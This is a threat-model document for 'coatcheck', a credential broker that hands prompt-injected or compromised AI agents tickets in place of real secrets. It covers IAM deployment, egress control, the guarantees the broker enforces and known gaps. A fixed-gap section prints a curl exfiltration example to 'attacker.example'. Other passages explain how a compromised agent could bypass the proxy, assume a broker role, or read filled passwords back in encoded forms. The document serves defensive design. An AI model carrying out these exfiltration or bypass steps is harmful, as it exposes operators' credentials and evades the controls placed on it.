# Threat model

## What coatcheck is for

An AI agent with shell access, a browser, and network egress processes
untrusted content (web pages, email, documents, search results, tool output).
Any of that content can carry instructions the model follows. coatcheck
assumes this happens and aims to keep real credentials out of everything the
agent can read: its process memory, environment, filesystem, logs, and model
context.

The agent receives a **ticket** (`cct_` + 64 hex chars) instead of a secret.
coatcheck swaps the ticket for the real value on the wire, after TLS
termination, on traffic it intercepts. For signing keys (AWS SigV4, HMAC
recipes) the agent signs with the ticket and coatcheck re-signs with the real
key, which never leaves coatcheck in any form.

## Attacker

A prompt-injected or otherwise compromised agent process that:

- runs arbitrary commands and code (shell, Node, Python, Playwright),
- shares a network namespace with coatcheck (sidecar deployment), so it can
  reach every loopback listener coatcheck exposes,
- can read and change its own environment (`HTTPS_PROXY`, `NO_PROXY`, CA trust),
- holds whatever cloud identity the agent workload runs as,
- can reach the internet unless egress is enforced below the agent.

Out of scope: compromise of the coatcheck process or its container image,
compromise of the secret store, the upstream API, or the remote browser vendor.

## Deployment pattern that makes a sidecar meaningful

A broker in the same network namespace only helps if the agent cannot simply
go around it to the secret store. Three properties are required.

1. **The agent's identity is explicitly denied the secret store.** Not merely
   "not granted": an explicit deny on the secret path, so a later broad grant
   does not silently re-open it.
2. **coatcheck holds a separate identity** that can read (and, for OAuth
   refresh, write) those secrets. The agent must not be able to obtain that
   identity.
3. **Egress is enforced below the agent** so traffic cannot bypass the broker
   (see Egress below).

### Worked example: AWS (ECS/Fargate)

The AWS provider (`packages/provider-aws/src/index.ts`) reads per-agent
secrets from SSM Parameter Store under `COATCHECK_AWS_SSM_PREFIX` (default
`/coatcheck/secrets/`; put `{agentId}` in it for a per-agent path) and shared
secrets from Secrets Manager under `COATCHECK_AWS_SHARED_PREFIX` (default
`coatcheck/`). It optionally assumes a role named by `COATCHECK_AWS_ROLE_ARN`
via STS before doing so.

- Agent task role: explicit `Deny` on `ssm:GetParameter*` and
  `ssm:PutParameter` for `/coatcheck/secrets/*`, and on
  `secretsmanager:GetSecretValue` for the shared secrets.
- Broker role (one per agent): `ssm:GetParameter`, `ssm:GetParametersByPath`,
  `ssm:PutParameter` on that agent's `/coatcheck/secrets/<agent-id>/*`, and
  `secretsmanager:GetSecretValue` on the specific shared secrets coatcheck is
  allowed to broker.
- Verification: from inside the agent container,
  `aws ssm get-parameter --with-decryption --name /coatcheck/secrets/<agent-id>/x`,
  `aws secretsmanager get-secret-value --secret-id <shared>` and
  `aws sts assume-role` on the broker role without the `ExternalId` all
  return `AccessDenied`.

**Pitfall: containers in one ECS task share one task role.** If the broker
role's trust policy trusts the task role, and the task role is allowed
`sts:AssumeRole` on the broker role, then the agent container can call
`sts:AssumeRole` itself (its SDK/CLI picks up the same task credentials from
the container credentials endpoint) and read every secret directly. The
explicit deny on the task role does not help, because the assumed broker role
is a different principal. Property 2 is violated. Ways to close it:

- Run coatcheck as a **separate task/service** with its own task role, and
  have the agent reach it over the network (then authenticate the vault API;
  see gaps).
- Keep the sidecar, but add a trust-policy condition only the broker can
  satisfy, for example an `sts:ExternalId` whose value is injected into the
  **broker container only** via a container-level secret (fetched by the
  execution role, not the task role), so the agent container never sees it.
- Block the agent container from the credentials endpoint (`169.254.170.2`)
  with egress rules, if nothing in the agent needs cloud credentials.

AWS-hosted agents should use a scoped task role for their own AWS access; coatcheck's SigV4 signing ([docs/design/signing-processors.md](design/signing-processors.md)) is for keys that can't be roles (agents off AWS, S3-compatible stores, a counterparty's IAM user key).

provider-aws supports the second option: `COATCHECK_AWS_EXTERNAL_ID` is sent as
`ExternalId` on `AssumeRole`, and coatcheck warns at startup when
`COATCHECK_AWS_ROLE_ARN` is set without it. [docs/deploy/aws-ecs.md](deploy/aws-ecs.md)
is the reference deployment for all three: task definition, IAM policies, the
per-launch-type limits on blocking `169.254.170.2`, egress rules, and CA key
handling.

### The `env` and `file` providers

Property 1 then means the agent cannot read the broker's environment or the
secrets file. Both hold real values in plaintext.

- `env`: set the `COATCHECK_SECRET_*` variables on the **coatcheck container
  only**. In a shared PID namespace, or when both processes run as the same
  OS user on one host, the agent can read `/proc/<pid>/environ`; run coatcheck
  in its own container, or as a different user.
- `file`: the agent must not be able to read `COATCHECK_SECRETS_FILE` or
  write its directory (a writable directory lets it swap the file). Don't
  mount it into the agent container; refresh writes keep mode `0600`.

Other platforms have the same shape: on Kubernetes, containers in a pod share
a service account, so a sidecar with a separate cloud identity needs either a
separate pod or a credential the agent container cannot read. On a VM, run the
broker as a different OS user with the credential readable only by that user.

## Egress: `HTTPS_PROXY` is advisory

Clients reach coatcheck because `HTTP_PROXY`/`HTTPS_PROXY` point at it. That is
a convention, not a control. A compromised agent can run `curl --noproxy '*'`,
unset the variables, or use a library that ignores them.

For secrets that only live in the broker, bypassing the proxy gains the
attacker nothing: the agent holds only tickets, and tickets resolve nowhere
else. Bypass matters for everything else the agent holds (files on disk,
tokens obtained elsewhere) and for exfiltrating data in general.

Recommendations, in order:

1. **Enforce egress below the agent.** Drop direct outbound TCP from the agent
   except to coatcheck. Examples: `iptables -A OUTPUT -o lo -j ACCEPT;
   iptables -A OUTPUT -p tcp --dport 443 -j DROP; iptables -A OUTPUT -p tcp
   --dport 80 -j DROP` set before the agent drops privileges (needs
   `NET_ADMIN` at setup), a Kubernetes `NetworkPolicy`, or a cloud security
   group that only allows the broker's egress. If the broker shares the
   agent's network namespace, rules keyed on the broker's UID (`-m owner`) are
   needed to let the broker out while blocking the agent.
2. **Domain allowlist in the broker.** Once all traffic must pass through
   coatcheck, refuse CONNECT/forward requests to hosts outside an allowlist.
   Not implemented.

Neither is needed to stop ticket redirection: coatcheck only substitutes a
ticket into requests to its secret's allowed hosts (see below), whether or not
the agent can also reach the internet directly.

## Properties that hold today

| Property | Mechanism |
|---|---|
| Real values never enter the agent's env, files, or model context via the vault API | `/_vault/*` and `/_secret/*` return tickets, never values (except fields the secret explicitly lists in `_cleartext`) (`packages/core/src/vault-handler.ts`) |
| A ticket alone is useless outside the broker | 32 random bytes; resolves only inside coatcheck's token store |
| Tickets are bound to destination hosts | Each ticket snapshots its secret's allowed hosts at mint: the intersection of the operator's policy file and the secret's in-band `_allowed_hosts` (`packages/core/src/secret-binding.ts`). Unbound secrets get no ticket (`403`) unless `COATCHECK_ALLOW_UNBOUND_SECRETS=1`. At swap time the host is the validated `CONNECT` target on HTTPS (upstream TLS verification makes it the real recipient; `Host` and SNI are ignored) and the WHATWG-parsed URL host on plain HTTP, which only matches `http://` entries, so loopback and private listeners never match unless listed. A mismatch is answered `403` (`X-Coatcheck-Denied: host-mismatch`) and nothing is forwarded; one denied ticket denies the whole request (`TokenStore.replaceAll`, `packages/core/src/mitm.ts`, `packages/core/src/forward.ts`) |
| Tickets swap only where their secret allows | By default only in the value of an `Authorization` or `Proxy-Authorization` header; the URL, other headers and the body are opt-in per secret (`swap_url`, `swap_headers`, `swap_body`), so the agent can't place a ticket where an allowed host would reflect it back (a 404 quoting the path, a stored query parameter, an echoed custom header). A ticket elsewhere is forwarded as the `cct_…` literal; header names are never scanned (`TokenStore.replaceAll`, `packages/core/src/mitm.ts`, `packages/core/src/forward.ts`; attack tests in `packages/core/src/server.test.ts`) |
| Swapping can't redirect a request | On plain HTTP, tickets are swapped only in the path, query and headers, never in the host or userinfo that decide where the request goes (`packages/core/src/forward.ts`) |
| OAuth refresh can't send `client_secret` elsewhere | The `token_url` host must be one of the secret's allowed hosts, checked before the token endpoint is called; the refreshed ticket inherits the binding (`packages/core/src/vault-handler.ts`) |
| Tickets expire | 900 s default (`COATCHECK_TICKET_TTL_SECONDS`) (`packages/core/src/token-store.ts`) |
| `curl -v` on the agent side shows only the ticket | Substitution happens after TLS termination, on coatcheck's upstream leg |
| No credential ticket ever enters the browser | Broker-performed login: coatcheck fills and submits the form itself over the CDP connection; there is no session-bound credential ticket to leak (`packages/core/src/cdp/login-driver.ts`) |
| The agent cannot run its own script while a real value is in the page | During the login window coatcheck holds the agent's CDP frames, removes the agent's new-document scripts and reloads to a fresh document, then fills; the agent resumes after the fields are gone or cleared (`packages/core/src/cdp/proxy.ts`, `packages/core/src/cdp/login-driver.ts`) |
| Broker login fills only allowed origins | The page's committed main-frame origin must match the login secret's allowed hosts; unknown origin, a navigation in progress, or request interception enabled → the login is refused (`403`/`409`) and nothing is filled (`packages/core/src/cdp/origin-tracker.ts`, `packages/core/src/cdp/login-driver.ts`) |
| Browser echo-back of a real value is redacted | Inbound frames are scanned for each login field value and its percent-, HTML-entity- and JSON-encoded forms, redacted to `[REDACTED:…]`; an unparseable frame still carrying one is dropped (`packages/core/src/cdp/substitution.ts`) |
| Shared secrets are allowlisted | `/_secret/{name}` refuses names not listed under `shared` in the operator's policy file; with no policy file, it refuses every name (`packages/core/src/policy.ts`, `packages/core/src/vault-handler.ts`) |
| Secret names are validated before any provider call | `^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$` (no `/`, no leading `.`), checked after URL-decoding on every route that takes a name; invalid names get `400` (`isValidSecretName`, `packages/core/src/secret-provider.ts`; `packages/core/src/vault-handler.ts`) |
| Upstream TLS is verified | `tls.connect` with default `rejectUnauthorized` (`packages/core/src/mitm.ts`) |
| CONNECT targets cannot reach a shell or the filesystem | Targets are parsed strictly (RFC 1123 DNS name or IP literal, port 1–65535; otherwise `400`) (`packages/core/src/connect-target.ts`). Certificates are generated in-process with WebCrypto; leaf keys stay in memory (LRU, 1000 entries) and only the CA is written to disk, when `COATCHECK_CA_DIR` is set (`packages/core/src/ca.ts`). |
| Browser-service responses carry no raw CDP route | With CDP enabled, adapter hosts' JSON responses are rewritten: the Browserbase adapter points every Browserbase `ws(s)` URL (session `connectUrl`, debug endpoint `wsUrl` and `debuggerUrl`s) at the local CDP proxy and deletes `signingKey`, `seleniumRemoteUrl` and live-view URLs; it also strips `extensionId` from session-create request bodies, and refuses (`403 uninspectable-body`) any request body on that host it can't read as JSON — content-encoded, over `COATCHECK_MAX_SWAP_BODY_BYTES`, or not JSON, `multipart/form-data` uploads excepted — so the strip can't be bypassed by re-shaping the body (`packages/core/src/browser-adapters.ts`, `packages/core/src/mitm.ts`, `packages/core/src/json-response-rewriter.ts`; attack test in `packages/core/src/server.test.ts`) |
| Signing keys never leave coatcheck | For a secret with `signing` (AWS SigV4, or an operator-written HMAC recipe), the mint issues one credential ticket and no ticket for the key field (`?field=secret_access_key` / `?field=secret` is `400`, and a broker login refuses to fill it into a page). The agent signs with the ticket; coatcheck verifies that signature over the request it received, then re-signs with the real key. The wire carries the access key id (or HMAC `key_id`) and a per-request signature, from which the key can't be recovered; signing tickets are never swapped as literals, and a request whose body must be hashed is refused past `COATCHECK_MAX_SWAP_BODY_BYTES` rather than streamed (`packages/core/src/signing/*`, `packages/core/src/mitm.ts`, `packages/core/src/forward.ts`; attack tests in `packages/core/src/signing.server.test.ts`) |
| Logs carry no values | Swap logs record secret names, host, and ticket age only; signing logs never carry signatures, canonical requests, strings-to-sign or key material (`packages/core/src/swap-log.ts`) |
| OAuth refresh failures don't log provider bodies | Only the HTTP status and the RFC 6749 `error` code (sanitised to `[A-Za-z0-9_.-]`, at most 64 chars) are logged (`oauthErrorCode`, `packages/core/src/vault-handler.ts`) |

## Known gaps

Severity reflects the attacker above. Bare file names are in `packages/core/src/`.

### Fixed: tickets were not bound to destination hosts

Before roadmap item 9, any active ticket was substituted into a request to any
destination, so

```bash
TOK=$(curl -s http://127.0.0.1:3128/_vault/some-api-key | jq -r .token)
curl -x http://127.0.0.1:3128 "http://attacker.example/?k=$TOK"
```

delivered the real value to `attacker.example`, or to a listener the agent ran
itself on loopback. Both now get `403` without being forwarded (see "Tickets
are bound to destination hosts" above; `packages/core/src/server.test.ts` performs both
attacks). What remains:

- An operator who sets `COATCHECK_ALLOW_UNBOUND_SECRETS=1` reopens this hole
  for every secret that has no allowed hosts. Each such swap is logged as
  `result=unbound`.
- A secret's binding is only as narrow as its list. `*.example.com` trusts
  every subdomain, including ones a third party can host content on.
- Broker login checks the page's committed main-frame origin and fills
  selectors in the main document only, so a form in a cross-origin iframe
  can't be filled (see "Residual risk accepted by design").

### MEDIUM: tickets are reusable until TTL

Tickets are never revoked on use; any number of requests to the ticket's
allowed hosts can carry the same ticket for 15 minutes
(`COATCHECK_TICKET_TTL_SECONDS`). There is no single-use option and no early
revocation.

### LOW: `bound` MITM mode decides per tunnel, at CONNECT time

Fixed in part by roadmap item 10: interception no longer depends on whether
the token store is empty. With `COATCHECK_MITM=bound` (the default) a
`CONNECT` is intercepted when its target is a policy host, an allowed host of
a live ticket, or the browser adapter host with CDP enabled; everything else
is a raw tunnel, because no ticket could be swapped there (`mitm.ts`). The
residual: a keep-alive tunnel opened to a host bound only in-band
(`_allowed_hosts`), before the first ticket for that host was minted, stays
passthrough for its whole life. It fails closed (the upstream sees `cct_…` and
rejects it). `COATCHECK_MITM=always` intercepts everything, and
`COATCHECK_PASSTHROUGH_HOSTS` exempts cert-pinned hosts in both modes (tickets
sent there are never swapped).

### LOW: listeners are open on loopback without a token

Fixed in part by roadmap item 11. With `COATCHECK_API_TOKEN` set, the vault
API requires `Authorization: Bearer` and the proxy requires
`Proxy-Authorization` (Basic with the token as password, or Bearer); failures
get `401`/`407` before any provider call or upstream dial, and the token is
compared in constant time and never logged (`auth.ts`, `server.ts`).
`loadConfig` refuses to start on a non-loopback bind (`0.0.0.0`, `::`, any
non-`127/8` address or hostname) without a token. What remains:

- Without a token (allowed on loopback only), any process that can reach the
  loopback port, which in the sidecar pattern is anything in the agent's
  network namespace, can mint tickets. That is the agent itself, so this is
  the intended trust boundary, not a bypass; host binding limits what the
  tickets can do.
- `/_health` and `/_ca` are always open (health probes, CA bootstrap). They
  reveal the active-ticket count and the public CA certificate.
- The token is one shared secret with no per-client identity or scope; an
  agent that is given it can do everything any other client can.
- The CDP listener ignores `COATCHECK_API_TOKEN` and authenticates only by
  sid, a 96-bit capability delivered inside an intercepted browser-service
  response (`docs/design/v1-decisions.md`, "API token details").

### LOW: Host header not checked against the CONNECT target

Inside a MITM'd tunnel the request's `Host` header is forwarded untouched
while the upstream socket goes to the CONNECT hostname (`mitm.ts`). TLS
SNI from the client is not compared either. Host binding keys on the CONNECT
target (the actual upstream, verified by upstream TLS), never on `Host` or
SNI, so a mismatched `Host` can't widen a ticket's reach; it only reaches the
upstream as a confusing request.

### MEDIUM: responses are not redacted; reflecting allowed hosts

coatcheck redacts real values from browser (CDP) frames, but not from HTTPS
or plain-HTTP responses. An allowed host that reflects a request back to the
agent (an echo service such as httpbin, a debug or token-introspection
endpoint, an error message that quotes the key) hands the agent the real
value it authenticated with.

Mitigated by swap placement: a ticket is swapped only in `Authorization` by
default, so the agent can't choose a reflecting spot (the path of a 404, a
custom header, a query parameter the API stores) unless the operator opted
the secret in there with `swap_url`, `swap_headers` or `swap_body`. What
remains is the operator's choice of hosts: binding a secret to a host that
echoes the header it authenticates with exposes the value. The quickstart
does this on purpose with httpbin to make the swap visible. A value an API
stores and later returns in a transformed form (encoded, truncated) is also
out of reach of any literal redaction.

### LOW: request bodies are swapped only on opt-in

The `Authorization` header is rewritten for every ticket; the URL and other
headers only for secrets with `swap_url` / `swap_headers` (see the previous
section) (`mitm.ts`, `forward.ts`).
Bodies are rewritten only for secrets with `swap_body` (policy) or
`_swap_body` (in-band), because a body is where an allowed host is most
likely to echo input back to the agent (validation errors, created
objects). Opting in accepts that reflection risk for that secret: an agent
that can get an allowed host to echo a request body can read the value.
A body is only buffered and scanned when a live `swap_body` ticket could be
swapped for the host, and only up to `COATCHECK_MAX_SWAP_BODY_BYTES`; other
bodies stream unscanned, so their tickets leave as literals (fail closed).
In a scanned body host binding applies (a mis-bound ticket denies the
request; test in `server.test.ts`), and a ticket of a secret that hasn't
opted in reaches the upstream as a literal. Content-encoded bodies are not
scanned. A real value with a control character (CR/LF) is never spliced
into a header, where it would inject header lines and could desync framing
with the upstream: the request is refused with `403 invalid-value` (attack
test in `server.test.ts`). Values in the request line are percent-encoded.
The header section is capped at 64 KiB (`431`), and buffered bodies at the
cap above (default 1 MiB), so one tunnel can't grow coatcheck's memory
without bound. The MITM parser frames `Transfer-Encoding: chunked` and
`Content-Length` bodies per RFC 9112 (`http1-framing.ts`), so body bytes can't
be parsed as a new request whose header tickets would be swapped. Ambiguous
framing (both headers, codings other than `chunked`, repeated or malformed
`Content-Length`, whitespace before a colon, obs-fold, malformed chunks) gets
`400` and the tunnel is closed, which refuses request smuggling between
coatcheck and the upstream. Request trailers pass through unswapped. The
MITM speaks HTTP/1.1 only and advertises just `http/1.1` over ALPN. After a
`101 Switching Protocols` response the tunnel becomes a raw pipe, so WebSocket
frames are neither swapped nor inspected.

### LOW: query-string auth and streaming signed payloads are not re-signed

Signing processors (`docs/design/signing-processors.md`) re-sign SigV4 in the
`Authorization` header only. A presigned URL carries the signing ticket in
`X-Amz-Credential`; it leaves as a literal (`result=placement-skipped`) and
the upstream rejects it. SigV4a and per-chunk signed streaming payloads
(`STREAMING-AWS4-HMAC-SHA256-PAYLOAD`) are refused with `403 unsignable`.
Both fail closed: no real key material is involved. Follow-ups in the
roadmap's "After 1.0" list.

### Fixed: agent scripts could read values filled into the page

Fixed by roadmap item 20 (broker-performed login): coatcheck no longer hands
the agent a credential ticket to fill. The v1 flow let the agent run its own
script (`page.evaluate`) once its `page.fill()` had put the real value into
the form, and read it back in a form the literal redactor couldn't recognise
(base64, reversal, char codes) — confirmed by
`examples/agents/browser-login/attack-transform.md`. coatcheck now fills and
submits the form itself over the CDP connection, on a freshly reloaded
document, with the agent's frames held and its new-document scripts removed,
so no agent-controlled code runs while the real value is in the page
(`cdp/login-driver.ts`, `cdp/proxy.ts`). Inbound redaction stays as a backstop
for browser-produced data and now also matches the browser's percent-, entity-
and JSON-encoded forms of each value (`cdp/substitution.ts`). Tests:
`cdp/login-driver.test.ts`, `cdp/proxy.test.ts`, `vault-handler.test.ts`, and
the Playwright + Chromium `cdp/e2e.test.ts` (which re-runs the four transform
reads and asserts none yields the password). This removed the v1 outbound
`Input.insertText` substitution, session-bound tickets, `mint-tokens`, and the
keystroke detector; see `docs/design/cdp-injection.md` for what each did.

### MEDIUM: second routes to the remote browser

The login window's protections (held agent frames, removed scripts, inbound
redaction) only apply to connections through coatcheck's CDP listener. An
agent with its own route to the same browser could read the fields while
coatcheck fills them.

Fixed in part by roadmap item 13, extended by item 20: with a valid
browser-service API-key ticket, the agent could call Browserbase's
`/v1/sessions/{id}/debug` and receive raw CDP and live-view URLs that never
pass through the CDP proxy. The adapter rewrites those URLs to the local proxy
or removes them, strips `signingKey` and `seleniumRemoteUrl` from responses,
and (item 20) strips `extensionId` from session-create request bodies, since
an uploaded extension can run agent code in the browser. A body on the adapter
host that coatcheck can't read as JSON (content-encoded, over
`COATCHECK_MAX_SWAP_BODY_BYTES`, or not JSON; `multipart/form-data` uploads
excepted, since no server reads those as a session config) is refused with
`403 uninspectable-body` instead of forwarded, so the strip can't be bypassed
by changing the body's shape (issue #13; attack tests per shape in
`packages/core/src/server.test.ts`). What remains: URL
shapes the adapter doesn't recognise, vendor endpoints outside the adapter
hosts, browser-service hosts listed in `COATCHECK_PASSTHROUGH_HOSTS`, and any
route the agent obtains from the vendor without coatcheck (for example a
vendor API key it holds directly).

## Residual risk accepted by design

- **Authenticated-action abuse.** An agent can use a credential for its
  intended purpose maliciously (delete repos, send messages, place orders).
  A broker controls where secrets go, not what an authorized call does.
- **Upstream trust.** The upstream API and the remote browser vendor see real
  values.
- **Signing authority and the access key id.** An agent holding a signing
  ticket can have any request to the secret's allowed hosts signed: the same
  authority as holding the credential for those hosts, as with a swap ticket.
  Authorisation stays with the upstream (IAM policy). Verification of the
  agent's signature is a correctness guard (coatcheck never signs a request it
  parsed differently), not a security boundary. The real access key id reaches
  the allowed host and could be echoed back; AWS treats it as an identifier,
  not a secret. The same holds for an HMAC recipe's `key_id`. HMAC recipes are
  the operator's: the agent never chooses what is signed or which headers
  real bytes land in.
- **Cleartext fields.** Fields listed in a secret's `_cleartext` are returned
  to the agent as plain values by design; only list non-sensitive data (URLs,
  account ids).
- **The login site receives the password.** coatcheck performs the login
  against the real site, which must receive the credential to authenticate;
  client-side-hashing and challenge logins work because the page's own JS sees
  the raw value. This is the same upstream-trust boundary as above.
- **Cross-origin iframe logins and 2FA are out of scope.** Selectors resolve in
  the main document only; a login whose form is an embedded cross-origin widget
  fails with `selector-not-found`. 2FA/OTP flows are not handled.
- **Binary and screenshot CDP frames are not inspected.** Redaction covers
  text frames; a screenshot taken outside the login window can capture whatever
  is rendered.
